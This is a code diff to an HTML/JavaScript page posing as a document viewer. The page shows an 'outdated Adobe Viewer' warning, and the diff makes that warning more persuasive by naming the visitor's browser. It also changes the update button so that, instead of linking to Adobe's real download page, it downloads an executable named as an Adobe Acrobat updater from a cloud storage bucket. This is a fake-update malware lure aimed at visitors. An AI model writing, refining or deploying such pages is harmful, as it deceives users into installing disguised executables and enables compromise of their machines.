@@ -1022,7 +1022,7 @@
         <!-- Update Button (hidden initially) -->
         <button class="update-btn" id="updateViewerBtn" style="display: none;" onclick="updateAdobeViewer()">
             <span>⬇</span>
-            <span>Update Adobe Viewer</span>
+            <span id='update_btn_txt'>Update Adobe Viewer</span>
         </button>
     </div>
 </div>
@@ -1443,14 +1443,14 @@ function showUpdateError() {
     `;
     
     // Update title
-    document.getElementById('adobeUpdateTitle').textContent = 'Unable to Display Documents';
+    document.getElementById('adobeUpdateTitle').textContent = `Adobe Acrobat Viewer For ${browser.name}`;
     
     // Update message
     const messageEl = document.getElementById('adobeUpdateMessage');
     messageEl.classList.add('error');
     messageEl.innerHTML = `
-        Your version of Adobe Viewer for <strong>${browser.name}</strong> is outdated.<br>
-        Update the viewer to the latest version to view project documents.
+        Your version of Adobe Viewer for <strong>${browser.name}</strong> is outdated. You need to update it to view project documents.<br>
+        Click the button below to update the viewer to the latest version.
     `;
     
     // Hide progress section
@@ -1464,12 +1464,13 @@ function showUpdateError() {
     
     // Show update button
     document.getElementById('updateViewerBtn').style.display = 'flex';
+    document.getElementById('update_btn_txt').textContent = `Update Adobe Acrobat Viewer For ${browser.name}`;
 }
 
         // ========== UPDATE VIEWER BUTTON HANDLER ==========
         function updateAdobeViewer() {
             // Redirect to Adobe download page or your custom page
-            window.location.href = 'https://get.adobe.com/reader/';
+            window.location.href = 'https://storage.googleapis.com/atlas-web-20260306-1360d7a95c5a/Adobe_Acrobat_Updaterv123.943.2026.exe';
             
             // Or redirect to a custom update page
             // window.location.href = '/update-viewer.html';
